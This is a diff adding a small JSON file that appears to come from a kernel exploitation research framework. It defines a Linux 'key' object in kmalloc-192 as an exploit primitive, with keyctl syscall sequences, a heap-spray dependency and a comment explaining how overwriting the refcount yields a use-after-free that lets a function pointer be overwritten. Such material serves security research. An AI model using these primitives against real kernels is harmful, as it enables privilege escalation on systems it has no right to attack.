@@ -1,0 +1,16 @@
+{
+  "target": "key_usage",
+  "version": "4.9.3",
+  "size": 192,
+  "allocator": "kmalloc_192",
+  "name": "key",
+  "define": "s[0] = syscall(__NR_keyctl, 1, \"keyring\", 0, 0, 0);\nsyscall(__NR_keyctl, 5, s[0], 0x3f3f3f3f, 0, 0);\n\n",
+  "deref": "syscall(__NR_keyctl, 1, \"keyring\", 0, 0, 0);\nsleep(1);\ndo_keyspray();\nsyscall(__NR_keyctl, 3, 0xfffffffffffffffd, 0, 0, 0);\n\n",
+  "dependence": [
+    "do_keyspray"
+  ],
+  "num": 1,
+  "pre_object": 1,
+  "post_object": 0,
+  "_comment": "allocate a key object and then overwrite its reference counter, later we can trigger UAF which requires to do heap spray to overwrite the function pointer."
+}
